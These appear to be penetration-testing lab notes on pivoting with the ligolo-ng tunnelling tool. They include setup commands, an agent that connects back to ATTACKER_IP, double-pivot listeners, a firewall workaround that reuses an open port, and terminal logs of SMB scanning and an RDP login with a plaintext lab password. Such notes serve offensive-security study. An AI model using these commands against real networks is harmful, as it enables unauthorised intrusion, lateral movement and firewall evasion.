
#### Setting up
Creating the `ligolo` network device:
```
sudo ip tuntap add user CURRENT_USERNAME mode tun ligolo
sudo ip link set ligolo up
```

#### Starting the proxy (attacker machine)
```
./proxy -selfcert
```

#### Starting the agent (target machines)
```
agent.exe -connect ATTACKER_IP:ATTACKER_PORT -ignore-cert
```

#### Adding the target IP route to the `ligolo` Networking device
Get the subnet from Ligolo: `Sessions --> select session --> ifconfig`. Make sure to replace the last octet with a `0`
```
ip route add SUBNET/24 dev ligolo
```
If the error message `Error: Invalid prefix for given prefix length.` pops up, set the last octet to `0`.
Cleaning up:
```
ip route del SUBNET/24
```

#### Double pivot
When a hidden domain host has another hidden domain inside of it, with a target host, double pivoting can be used. For this, the `listener_add` function can be used to forward remote ports to local ones:
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp        // For handling the double pivot
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp            // For uploading the agent
```

Because every Network device can only have one pivot set up, a new one needs to be added:
```
sudo ip tuntap add user CURRENT_USERNAME mode tun ligolo2
sudo ip link set ligolo2 up
start --tun ligolo2                                                 // In the session with the second pivot
```


##### Example: Windows target
```
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0010] Agent joined.                                 name="MULTISERVER03\\rdp_admin@MULTISERVER03" remote="192.168.171.64:56242"
ligolo-ng » session
? Specify a session : 1 - #1 - MULTISERVER03\rdp_admin@MULTISERVER03 - 192.168.171.64:56242
[Agent : MULTISERVER03\rdp_admin@MULTISERVER03] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:9e:9e:e7              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::80af:e261:645f:a8f/64    │
│ IPv4 Address │ 192.168.171.64/24              │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:9e:54:7e              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::41f2:e449:cbf7:4b1e/64   │
│ IPv4 Address │ 10.4.171.64/24                 │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : MULTISERVER03\rdp_admin@MULTISERVER03] »  

// Another terminal
┌─[✗]─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #ip route add 10.4.171.0/24 dev ligolo

// Back to the session

[Agent : Unknown@MULTISERVER03] » start
INFO[0236] Starting tunnel to Unknown@MULTISERVER03    

// All ready.
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #nxc smb 10.4.171.0/24
SMB         10.4.171.64     445    MULTISERVER03    [*] Windows 10.0 Build 20348 x64 (name:MULTISERVER03) (domain:MULTISERVER03) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /cert:ignore /v:10.4.171.64 /clipboard /cert:ignore /size:1920x1080 /drive:NAME,/tmp
[22:15:44:633] [1154920:1154921] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[22:15:44:635] [1154920:1154921] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[22:15:44:715] [1154920:1154921] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[22:15:44:715] [1154920:1154931] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [NAME] (static)
[22:15:44:716] [1154920:1154921] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx

```




### Error handling: Firewalls (`The target machine actilvely refused it`)
When getting this error (and no response on the listener), it usually means that there is a firewall.
```
time="2024-06-02T06:12:00-07:00" level=fatal msg="dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."
```

To circumvent the issue, have the attacker listen on a port that the target has open (ex: 5985).
###### Example
```
PS C:\TEMP> ./agent.exe -connect 192.168.45.182:11606 -ignore-cert
./agent.exe -connect 192.168.45.182:11606 -ignore-cert
time="2024-06-02T06:11:58-07:00" level=warning msg="warning, certificate validation disabled"
time="2024-06-02T06:12:00-07:00" level=error msg="Connection error: dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."
time="2024-06-02T06:12:00-07:00" level=fatal msg="dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."



┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/static-tools/ligolo]
└──╼ #./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » ^C
input Ctrl-c once more to exit
ligolo-ng » ^C
interrupted


PS C:\TEMP> ./agent.exe -connect 192.168.45.182:5985 -ignore-cert
./agent.exe -connect 192.168.45.182:5985 -ignore-cert
time="2024-06-02T06:26:21-07:00" level=warning msg="warning, certificate validation disabled"
time="2024-06-02T06:26:21-07:00" level=info msg="Connection established" addr="192.168.45.182:5985"

┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/static-tools/ligolo]
└──╼ #./proxy -selfcert -laddr 0.0.0.0:5985
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:5985                    
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0011] Agent joined.                                 name="NT Service\\MSSQL$SQLEXPRESS@WEB02" remote="192.168.219.121:57996"


```
